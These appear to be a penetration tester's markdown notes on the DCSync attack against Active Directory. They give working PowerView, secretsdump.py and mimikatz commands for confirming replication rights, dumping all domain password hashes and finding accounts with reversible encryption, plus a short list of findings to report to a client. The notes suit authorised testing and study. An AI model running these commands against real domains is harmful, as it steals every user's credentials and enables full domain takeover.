# Checking User’s Permissions for DCSync
Using Get-DomainUser to view their group membership
```JavaScript
Get-DomainUser -Identity <user>  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```
![[../../assets/DCSync/image 365.png|image 365.png]]
  
Use PowerView to confirm that this standard user has DCSync rights
- need their SPN from the previous command
- check ACLs set on the domain object “DC=<DOMAIN>,DC=<DOMAIN>” using the Get-ObjectAcl function
- search for specifically replication rights with the compromised user denoted by $sid
```JavaScript
$sid= "<sid>"
Get-ObjectAcl "DC=<DOMAIN>,DC=<DOMAIN>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
![[../../assets/DCSync/image 1 273.png|image 1 273.png]]
- if the user doesn’t have these writes, but we have another user that has WriteDACL over the target user, then we can add the right, perform DCSync, then remove it
  
  
# Secretsdump.py
```JavaScript
secretsdump.py -outputfile <outfile> -just-dc <DOMAIN>/<user>@<IP>
```
![[../../assets/DCSync/image 2 232.png|image 2 232.png]]
- can use -just-dc-ntlm if we only want NTLM hashes
- can use -just-dc-user <user> to only get their info
- -pwd-last-set
- -history to dump password history
- -user-status to see if the user is disabled
  
why do some users have their password in cleartext when dumping?
- if they are using reversible encryption, the Syskey can be used to decrypt their password
    
    - some companies do this so they can perform password audits without offline cracking tools
    
- you can see what users have reversible encryption using PowerShell
  
Checking if a user has reversible encryption
```JavaScript
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```
![[../../assets/DCSync/image 3 200.png|image 3 200.png]]
  
# What to Give the Client
after performing a DCSync attack, we should give the following information
- number and % of passwords cracked
- top 10 passwords
- password length metrics
- password re-use
  
  
# Mimikatz
need to run mimikatz as the user with DCSync privileges
```JavaScript
runas /netonly /user:<DOMAIN>\<user> powershell
```
  
now that we are running powershell as the target user, we can run mimikatz
```JavaScript
./mimikatz.exe
privilege::debug
lsadump::dcsync
```
![[../../assets/DCSync/image 4 176.png|image 4 176.png]]